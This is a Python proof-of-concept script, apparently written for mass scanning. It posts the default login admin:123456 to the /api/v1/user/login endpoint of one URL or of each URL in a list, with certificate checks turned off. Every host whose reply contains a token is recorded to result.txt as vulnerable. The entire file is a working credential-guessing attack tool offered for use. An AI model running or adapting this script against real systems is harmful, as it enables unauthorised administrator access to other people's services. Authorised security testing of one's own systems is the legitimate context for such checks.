#-*- coding: utf-8 -*-
import argparse
import textwrap
import sys
import requests
requests.packages.urllib3.disable_warnings() #警告不显示
# requests.post(url, data=data,verify=False) #忽略ssl证书校验，会出现警告


def banner():
    test = """
     
██╗    ██╗███████╗ █████╗ ██╗  ██╗    ██████╗  █████╗ ███████╗███████╗██╗    ██╗ ██████╗ ██████╗ ██████╗ 
██║    ██║██╔════╝██╔══██╗██║ ██╔╝    ██╔══██╗██╔══██╗██╔════╝██╔════╝██║    ██║██╔═══██╗██╔══██╗██╔══██╗
██║ █╗ ██║█████╗  ███████║█████╔╝     ██████╔╝███████║███████╗███████╗██║ █╗ ██║██║   ██║██████╔╝██║  ██║
██║███╗██║██╔══╝  ██╔══██║██╔═██╗     ██╔═══╝ ██╔══██║╚════██║╚════██║██║███╗██║██║   ██║██╔══██╗██║  ██║
╚███╔███╔╝███████╗██║  ██║██║  ██╗    ██║     ██║  ██║███████║███████║╚███╔███╔╝╚██████╔╝██║  ██║██████╔╝
 ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝    ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝ ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═════╝ 
                                                                                                         

                                       tag:  this is a  weak Password poc                                       
                                                 @version: 1.0.0   @author: EDISON  
    """
    print(test)


def poc(target):
    url = target + "/api/v1/user/login"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
        "Content-Type": "application/json;charset=UTF-8"
    }
    json = {
        "username": "admin",
        "password": "123456"
    }
    try:
        res = requests.post(url, headers=headers, json=json, verify=False, timeout=5).text
        if "token" in res:
            print(f"[+] {target} is vulable,[admin:123456]")
            with open("result.txt", "a+", encoding="utf-8") as f:
                f.write(target + "\n")
        else:
            print(f"[-] {target} is not vulable")
    except:
        print(f"[*] {target} server error")




def main():
    banner()
    parser = argparse.ArgumentParser(description='JAPANESE weak Password poc')
    parser.add_argument("-u", "--url", dest="url", type=str, help=" example:http:// www.xxx.com")
    parser.add_argument("-f", "--file", dest="file", type=str,help="urls.txt")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        print(f"正在使用-f操作{args.file}")
        url_list = []
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        for j in url_list:
            poc(j)
    else:
        print(f"Usag:\n\t python {sys.argv[0]} -h")

if __name__ == '__main__':
    main()